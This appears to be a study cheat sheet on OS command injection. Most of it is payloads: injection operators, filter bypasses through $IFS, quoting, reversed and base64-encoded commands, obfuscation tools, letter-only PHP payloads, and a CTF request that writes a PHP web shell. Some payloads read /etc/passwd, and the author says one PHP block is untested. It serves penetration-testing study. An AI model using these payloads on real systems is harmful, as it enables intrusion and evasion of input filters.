


# Detection

Append a coomand to the preceding one:


|Injection Operator 	 |   Injection Character 	|URL-Encoded Character 	   |     Executed Command|
|------------------------|------------------------------|--------------------|----------------------|
Semicolon 	    |            ; 	             |           %3b 	                |        Both
New Line 	         |       \n 	          |              %0a 	                 |       Both
Background 	             |    & 	             |           %26 	                  |      Both (second output generally shown first)
Pipe 	                  |   \| 	       |                 %7c 	                   |     Both (only second output is shown)
AND 	                 |    && 	       |             %26%26 	                   |     Both (only if first succeeds)
OR 	                       |  \|\| 	          |          %7c%7c 	                  |      Second (only if first fails)
Sub-Shell 	               |  `` 	                |    %60%60 	                    |    Both (Linux-only)
Sub-Shell 	               |  $() 	                |    %24%28%29 	               |     Both (Linux-only)


For basic command injection, all of these operators can be used for command injections regardless of the web application language, framework, or back-end server. 


#### AND Operator

`$ ping -c 1 127.0.0.1 && whoami`

#### OR Operator

`$ ping -c 1 127.0.0.1 || whoami`

    ! If we try to use our usual payload with the || operator (127.0.0.1 || whoami), we will see that only the first command would execute



# InjectionType-Operator Map

|Injection Type 	        |                Operators|
|------------|----------------------------------|
SQL Injection 	                |        ' , ; -- /* */
Command Injection 	           |             ; &&
LDAP Injection 	              |            * ( ) & |
XPath Injection 	          |      ' or and not substring concat count
OS Command Injection 	     |               ; & |
Code Injection 	           |         ' ; -- /* */ $() ${} #{} %{} ^
Directory Traversal/File Path Traversal |	../ ..\\ %00
Object Injection 	           |                 ; & |
XQuery Injection 	         |               ' ; -- /* */
Shellcode Injection 	      |              \x \u %u %n
Header Injection 	        |            \n \r\n \t %0d %0a %09




# Identifying Filters

## Blacklisted Characters

The PHP code may look something like the following:

```
    $blacklist = ['&', '|', ';', ...SNIP...];
    foreach ($blacklist as $character) {
        if (strpos($_POST['ip'], $character) !== false) {
            echo "Invalid input";
        }
    }
```

#### Bypass space blacklist

- (%0a = \n)

`127.0.0.1%0a whoami ---> error`


- Using Tabs

`127.0.0.1%0a%09whoami `


- Using $IFS

default value is a space and a tab

`127.0.0.1%0a${IFS}`


- Using Brace Expansion

automatically adds spaces between arguments wrapped between braces

`$ {ls,-la}`

    

- Slashes

    - In Linux

        these characters may be used in an environment variable, and we can specify start and length of our string to exactly match this character.

        So, if we start at the 0 character, and only take a string of length 1, we will end up with only the / character in ${PATH}

        `$ echo ${PATH:0:1}`

        `$ echo ${LS_COLORS:10:1}`  output --->   ;

    


        `127.0.0.1${LS_COLORS:10:1}${IFS}`


    - Windows

        The same concept work on Windows as well.  
        `C:\htb> echo %HOMEPATH:~6,-11%`

        We can achieve the same thing using the same variables in Windows PowerShell

        `$env:HOMEPATH[0]`



#### Character Shifting

For example, the following Linux command shifts the character we pass by 1.

`$ echo $(tr '!-}' '"-~'<<<[)`

#### Bypassing Blacklisted Commands

- Linux

`$ w'h'o'am'i`

`$ w"h"o"am"i%0ai'd'`

We can insert a few other Linux-only characters in the middle of commands, and the bash shell would ignore them and execute the command.

`$who$@ami`

`$w\ho\am\i`


- Windows

`C:\htb> who^ami`


## Advanced Command Obfuscation


#### Case Manipulation


`$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`

`$(a="WhOaMi";printf %s "${a,,}")`


#### Reversed Commands


`$ $(rev<<<'imaohw')`

    Tip: If you wanted to bypass a character filter with the above method, you'd have to reverse them as well, or include them when reversing the original command.


The same can be applied in Windows.

`PS C:\htb> "whoami"[-1..-20] -join ''`

`PS C:\htb> iex "$('imaohw'[-1..-20] -join '')"`


#### Encoded Commands

- Linux
The final technique we will discuss is helpful for commands containing filtered characters or characters that may be URL-decoded by the server.

We can utilize various encoding tools, like base64 (for b64 encoding) or xxd (for hex encoding)

`$ echo -n 'cat /etc/passwd | grep 33' | base64`

now we can create a command that will decode the encoded string in a sub-shell ($()), and then pass it to bash to be executed (i.e. bash<<<), as follows:


`$ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)`


    Tip: Note that we are using <<< to avoid using a pipe |, which is a filtered character.



- Windows

`PS C:\htb> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))`

We may also achieve the same thing on Linux, but we would have to convert the string from utf-8 to utf-16 before we base64 it, as follows:

`$ echo -n whoami | iconv -f utf-8 -t utf-16le | base64`

`PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"`





# Evasion Tools


## Linux (Bashfuscator)

`$ git clone https://github.com/Bashfuscator/Bashfuscator`
`$ cd Bashfuscator`
`$ python3 setup.py install --user`

Once we have the tool set up, we can start using it from the ./bashfuscator/bin/ directory

`$ ./bashfuscator -c 'cat /etc/passwd'`



## Windows (DOSfuscation)
```
    PS C:\htb> git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
    PS C:\htb> cd Invoke-DOSfuscation
    PS C:\htb> Import-Module .\Invoke-DOSfuscation.psd1
    PS C:\htb> Invoke-DOSfuscation
```


# Tips n Tricks


## PHP


#### Injection with [A-Z,a-z,(,)]

if you cant use special characters like `;` , `:` , `[` , `]` , `"` , `'` , `{space}` ,  `.`  , etc. but u still use `letters`, commas`,` and `parenthesis ()` :


- Built  array() fun with null elements:

`array(null,null,...)`

- Use count() func which returns the length of the array as an integer:

`count(array(null,null,...))`

- Use chr() func , which accepts integers in range [0-255] and returns a one byte character 

`chr(count(array(null,null,...)))`

- use array() again to group the chr() return characters:

`array(chr(count(array(null,null,...))),chr(count(array(null,null,...))),.... )`

- Implode()` implode(string $separator, array $array): string` groups arrays of characters and returns a string:

`implode(array(chr(count(array(null...))),chr(count(array(null...))),...))`


- Now you can pass that to [file()](https://www.php.net/manual/en/function.file.php) and then again to implode to read the file , or directly to [get_file_contents](https://www.php.net/manual/en/function.file-get-contents.php).


You can create the above structures with pure python3:

```

def create_count(n):
    return "count(array(" + ",".join(["null"] * n) + "))"

def create_chr(n):
    return "chr(" + create_count(n) + ")"

def encode_string(s):
    return "implode(array(" + ",".join(create_chr(ord(c)) for c in s) + "))"

```


#### Pretty much flexxing here

i havent tested those but i found them in a ctf writeup so here there are:

```
finding numbers :

1 : pow((int)cos(rand()),(int)cos(rand()))

2 : round(cosh(pow((int)cos(rand()),(int)cos(rand()))))

3 : floor(pi())

4 : pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),round(cosh(pow((int)cos(rand()),(int)cos(rand())))))

5 : floor(sqrt(pow(floor(pi()),floor(pi()))))

6 : pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),round(cosh(pow((int)cos(rand()),(int)cos(rand())))))^round(cosh(pow((int)cos(rand()),(int)cos(rand()))))

8 : floor(sqrt(cosh(floor(sqrt(pow(floor(pi()),floor(pi())))))))

9 : floor(pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),sqrt(cosh(floor(pi())))))

64 : pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),round(cosh(pow((int)cos(rand()),(int)cos(rand())))))^round(cosh(pow((int)cos(rand()),(int)cos(rand())))))

32 : pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),floor(sqrt(pow(floor(pi()),floor(pi())))))


find chars :

l (108) : chr(pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),round(cosh(pow((int)cos(rand()),(int)cos(rand())))))^round(cosh(pow((int)cos(rand()),(int)cos(rand())))))^pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),floor(sqrt(pow(floor(pi()),floor(pi())))))^floor(sqrt(cosh(floor(sqrt(pow(floor(pi()),floor(pi())))))))^pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),round(cosh(pow((int)cos(rand()),(int)cos(rand()))))))

s (115) : chr(pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),round(cosh(pow((int)cos(rand()),(int)cos(rand())))))^round(cosh(pow((int)cos(rand()),(int)cos(rand())))))^pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),floor(sqrt(pow(floor(pi()),floor(pi())))))^pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),round(cosh(pow((int)cos(rand()),(int)cos(rand()))))))^floor(pi()))

system(ls) : system(implode(array(chr(pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),round(cosh(pow((int)cos(rand()),(int)cos(rand())))))^round(cosh(pow((int)cos(rand()),(int)cos(rand())))))^pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),floor(sqrt(pow(floor(pi()),floor(pi())))))^floor(sqrt(cosh(floor(sqrt(pow(floor(pi()),floor(pi())))))))^pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),round(cosh(pow((int)cos(rand()),(int)cos(rand())))))),chr(pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),round(cosh(pow((int)cos(rand()),(int)cos(rand())))))^round(cosh(pow((int)cos(rand()),(int)cos(rand())))))^pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),floor(sqrt(pow(floor(pi()),floor(pi())))))^pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),round(cosh(pow((int)cos(rand()),(int)cos(rand()))))))^floor(pi())))))

f (102) : chr(pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),round(cosh(pow((int)cos(rand()),(int)cos(rand())))))^round(cosh(pow((int)cos(rand()),(int)cos(rand())))))^pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),floor(sqrt(pow(floor(pi()),floor(pi())))))^pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),round(cosh(pow((int)cos(rand()),(int)cos(rand())))))^round(cosh(pow((int)cos(rand()),(int)cos(rand())))))

l (108) : chr(pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),round(cosh(pow((int)cos(rand()),(int)cos(rand())))))^round(cosh(pow((int)cos(rand()),(int)cos(rand())))))^pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),floor(sqrt(pow(floor(pi()),floor(pi())))))^floor(sqrt(cosh(floor(sqrt(pow(floor(pi()),floor(pi())))))))^pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),round(cosh(pow((int)cos(rand()),(int)cos(rand()))))))

a (97) : chr(pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),round(cosh(pow((int)cos(rand()),(int)cos(rand())))))^round(cosh(pow((int)cos(rand()),(int)cos(rand())))))^pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),floor(sqrt(pow(floor(pi()),floor(pi())))))^pow((int)cos(rand()),(int)cos(rand())))

g (103) : chr(pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),round(cosh(pow((int)cos(rand()),(int)cos(rand())))))^round(cosh(pow((int)cos(rand()),(int)cos(rand())))))^pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),floor(sqrt(pow(floor(pi()),floor(pi())))))^pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),round(cosh(pow((int)cos(rand()),(int)cos(rand())))))^round(cosh(pow((int)cos(rand()),(int)cos(rand()))))^pow((int)cos(rand()),(int)cos(rand())))

. (46) : chr(pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),floor(sqrt(pow(floor(pi()),floor(pi())))))^floor(sqrt(cosh(floor(sqrt(pow(floor(pi()),floor(pi())))))))^pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),round(cosh(pow((int)cos(rand()),(int)cos(rand())))))^round(cosh(pow((int)cos(rand()),(int)cos(rand())))))

p (112) : chr(pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),round(cosh(pow((int)cos(rand()),(int)cos(rand())))))^round(cosh(pow((int)cos(rand()),(int)cos(rand())))))^pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),floor(sqrt(pow(floor(pi()),floor(pi())))))^pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),round(cosh(pow((int)cos(rand()),(int)cos(rand())))))))

h (104) : chr(pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),round(cosh(pow((int)cos(rand()),(int)cos(rand())))))^round(cosh(pow((int)cos(rand()),(int)cos(rand())))))^pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),floor(sqrt(pow(floor(pi()),floor(pi())))))^floor(sqrt(cosh(floor(sqrt(pow(floor(pi()),floor(pi()))))))))

c (99) : chr(pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),round(cosh(pow((int)cos(rand()),(int)cos(rand())))))^round(cosh(pow((int)cos(rand()),(int)cos(rand())))))^pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),floor(sqrt(pow(floor(pi()),floor(pi())))))^floor(pi()))

t (116) : chr(pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),round(cosh(pow((int)cos(rand()),(int)cos(rand())))))^round(cosh(pow((int)cos(rand()),(int)cos(rand())))))^pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),floor(sqrt(pow(floor(pi()),floor(pi())))))^pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),round(cosh(pow((int)cos(rand()),(int)cos(rand()))))))^pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),round(cosh(pow((int)cos(rand()),(int)cos(rand()))))))

' ' (32) : chr(pow(round(cosh(pow((int)cos(rand()),(int)cos(rand())))),floor(sqrt(pow(floor(pi()),floor(pi()))))))
```



#### Argument Injection :  Inject into system('find + $cmd')


Bash can parse octal strings like this:

```
$ echo "\047\051\073\040\077\076\012"

'); ?>
```

You can generate commands like this :


`python3 -c "s = \"<?php system('whoami') ?>\"; print(''.join('\\{:03o}'.format(ord(c)) for c in s))"`


you can inject to php code like this (QnQSec CTF 2025 -Faas challenge):

```
<?php
    $cmd = $_GET['cmd'];
    if (!isset($cmd)) {
        highlight_file(__FILE__) && die();
    }
    
    if (strpos($cmd, ";") !== False || strpos($cmd, "|") !== False || strpos($cmd, "$") !== False ||
    strpos($cmd, "`") !== False || strpos($cmd, "&") !== False || strpos($cmd, "\n") !== False ||
    strpos($cmd, ">") !== False || strpos($cmd, "<") !== False || strpos($cmd, "(") !== False ||
    strpos($cmd, ")") !== False || strpos($cmd, " ") !== False || strpos($cmd, "\r") !== False ||
    strpos($cmd, "+") !== False || strpos($cmd, "{") !== False || strpos($cmd, "}") !== False ||
    strpos($cmd, "[") !== False || strpos($cmd, "]") !== False) {
        die("Bad bad hacker :<");
    }
    
    $cmd = "find " . $cmd;
    print($cmd);
    system($cmd,$retval);
    print($retval);
```

```
GET /?cmd=.%09-maxdepth%090%09-fprintf%09shell.php%09\\074?php\\040echo\\040shell_exec\\050\\047\\057readflag\\040i\\040want\\040the\\040flag\\040please\\047\\051\\073\\040\\077\\076\\012 HTTP/1.1
```





